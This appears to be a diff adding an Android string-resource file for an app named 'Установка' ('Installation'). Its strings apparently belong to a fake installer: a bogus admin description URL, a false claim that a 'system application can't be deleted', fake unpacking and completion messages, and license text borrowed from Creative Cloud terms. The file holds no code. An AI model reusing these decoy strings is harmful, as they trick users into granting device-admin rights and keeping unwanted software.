@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Установка</string>
+    <string name="admin_description">http://google.com/ext/gnu/</string>
+    <string name="warn_win">Required action</string>
+    <string name="denied">"Operation is forbidden!
+
+ System application can’t be deleted."</string>
+    <string name="continues">Continue</string>
+    <string name="pls_wait">Please, wait..</string>
+    <string name="reg">"
+Please, wait.
+
+Unpacking the components…
+"</string>
+    <string name="plugin">Installation is complete</string>
+    <string name="warn">"Product licenses and terms of use
+
+These terms govern your use of our website or services such as the Creative Cloud (collectively, “Services”) and software that we include as part of the Services, including any applications, Content Files (defined below), scripts, instruction sets, and any related documentation (collectively “Software”). By using the Services or Software, you agree to these terms."</string>
+</resources>
